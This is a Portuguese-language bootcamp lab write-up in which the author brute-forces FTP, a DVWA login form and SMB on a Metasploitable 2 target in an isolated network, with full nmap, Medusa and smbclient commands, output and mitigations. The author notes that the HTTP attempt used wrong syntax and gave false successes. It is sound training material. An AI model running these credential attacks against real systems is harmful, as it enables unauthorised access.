# Ataques de Força Bruta em Ambiente Controlado: FTP, Web e SMB

Projeto prático do bootcamp **Santander – Cibersegurança do Zero à Prática** (DIO), simulando ataques de força bruta contra serviços vulneráveis para exercitar reconhecimento, exploração controlada e recomendações de mitigação.

## Objetivo

Implementar, documentar e compartilhar um exercício de pentest usando Kali Linux e Medusa contra uma máquina Metasploitable 2 (com DVWA), cobrindo três cenários: força bruta em FTP, automação de login web e password spraying em SMB.

## Ambiente

| Item | Descrição |
|---|---|
| Atacante | Kali Linux (VirtualBox) |
| Alvo | Metasploitable 2 — `192.168.56.101` |
| Rede | Host-only (isolada, sem acesso à internet) |
| Ferramentas | Nmap, Medusa, enum4linux, smbclient |

## 1. Reconhecimento

**Verificação de conectividade**
```
ping -c 3 192.168.56.101
```
PING 192.168.56.101 (192.168.56.101) 56(84) bytes of data.
64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=1.48 ms
64 bytes from 192.168.56.101: icmp_seq=2 ttl=64 time=1.05 ms
64 bytes from 192.168.56.101: icmp_seq=3 ttl=64 time=1.19 ms

--- 192.168.56.101 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2120ms
rtt min/avg/max/mdev = 1.054/1.241/1.479/0.177 ms

**Varredura de portas e serviços**
```
nmap -sV -p 21,22,80,445,139 192.168.56.101
```
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

**Resultado:** cinco serviços identificados, usados como alvo nos cenários abaixo.

## 2. Cenário 1 — Força bruta em FTP

```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```
```
2026-11-17 19:21:38 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

**Resultado:** credencial válida encontrada — `msfadmin:msfadmin`.

**Mitigação:**
- Trocar credenciais padrão/fracas por senhas fortes e únicas.
- Desabilitar login FTP anônimo e exigir autenticação forte ou chave.
- Aplicar bloqueio de conta após N tentativas falhas (fail2ban ou equivalente).

## 3. Cenário 2 — Automação de login no DVWA

Acesso manual à página de login para identificar o fluxo de autenticação via DevTools (F12):

- URL: `http://192.168.56.101/dvwa/login.php`
- Método: `POST`, mesma URL da página
- Cookie de sessão: `PHPSESSID`, nível de segurança do DVWA: `security=high`
- Campos enviados: `username`, `password`, `Login`

```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
```

**Resultado:** o módulo `http` do Medusa não reconheceu os parâmetros `PAGE`, `FORM` e `FAIL` (sintaxe não suportada por esse módulo), então o comando ficou sem um critério para diferenciar login certo de errado e marcou **todas** as combinações testadas como sucesso — incluindo `root:qwerty`, o que não é um resultado confiável. Por isso, este cenário não traz uma credencial validada por essa via.

Como validação cruzada, a mesma senha fraca encontrada no FTP (`msfadmin:msfadmin`) sugere reuso de credenciais entre serviços no ambiente.

**Mitigação:**
- Implementar limite de tentativas e CAPTCHA no formulário de login.
- Monitorar e alertar sobre tentativas repetidas de autenticação.
- Não reutilizar a mesma senha entre serviços diferentes.

## 4. Cenário 3 — Password spraying em SMB

**Enumeração de usuários (enum4linux)** — saída completa em [`enum4_output.txt`](./enum4_output.txt).

```
smb_users.txt: user, msfadmin, service
senhas_spray.txt: password, 123456, Welcome123, msfadmin
```
```
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```
```
2026-11-22 16:57:45 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

**Resultado:** apenas `msfadmin:msfadmin` validada, com acesso administrativo ao compartilhamento `ADMIN$`. Confirma mais uma vez o reuso da mesma senha fraca.

**Verificação dos compartilhamentos com a credencial encontrada:**
```
smbclient -L //192.168.56.101 -U msfadmin
```
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service
ADMIN$          IPC       IPC Service
msfadmin        Disk      Home Directories
```

**Mitigação:**
- Aplicar política de senha forte e exigir troca de credenciais padrão.
- Restringir acesso administrativo a compartilhamentos (`ADMIN$`) por IP/usuário.
- Monitorar tentativas de autenticação SMB malsucedidas.

## Conclusão

O conhecimento de ferramentas e como utilizá-las de forma correta, pode nos auxiliar em um ataque ou defesa no dia a dia. O constante estudo e atualização do conhecimento sobre novas tecnologias que envolvem o assunto, são cruciais para um bom professional.

## Aviso

Testes realizados exclusivamente em ambiente de laboratório isolado (rede host-only), sem acesso a sistemas de terceiros ou produção.
